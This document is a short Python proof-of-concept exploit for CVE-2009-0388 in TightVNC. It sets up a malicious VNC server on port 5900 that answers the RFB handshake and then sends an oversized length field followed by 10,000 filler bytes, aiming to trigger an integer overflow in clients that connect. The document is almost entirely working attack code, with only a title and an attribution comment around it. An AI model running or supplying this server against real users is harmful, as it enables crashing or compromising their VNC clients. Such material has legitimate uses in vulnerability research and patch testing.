TightVNC Authentication Failure Integer Overflow PoC
====================================================





#!/usr/bin/env python

#digital.desi@in.com

# Modified  Andres Lopez Luksenberg&#039;s exploit for Authentication Failure scenario in TightVNC. BID 33569 CVE-2009-0388

import socket

serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.bind((&#039;&#039;, 5900))
serversocket.listen(1)

while True:
		clientsocket, clientaddres = serversocket.accept()
		
		data = &#039;RFB 003.008\n&#039;
		clientsocket.sendall(data)

		data_cli = clientsocket.recv(1024)
		print data_cli

		data = &#039;\x02\x02\x10&#039;
		clientsocket.sendall(data)

		data_cli = clientsocket.recv(1024)

		data = &#039;\x00&#039;*4
		clientsocket.sendall(data)

		data = (&#039;\x00&#039;*3)+&#039;\x01&#039;
		clientsocket.sendall(data)

		data = (&#039;\x00&#039;*3)+&#039;\x02STDVVNCAUTH_&#039;
		clientsocket.sendall(data)

		data_cli = clientsocket.recv(1024)

		data = (&#039;\x01&#039;*16)
		clientsocket.sendall(data)

		data_cli = clientsocket.recv(1024)
		
		data = &#039;\x00\x00\x00\x01&#039;
		clientsocket.sendall(data)

		data = &#039;\xf0\xff\xff\xff&#039;
		clientsocket.sendall(data)

		data = &#039;A&#039;*10000
		clientsocket.sendall(data)

clientsocket.close()
serversocket.close()



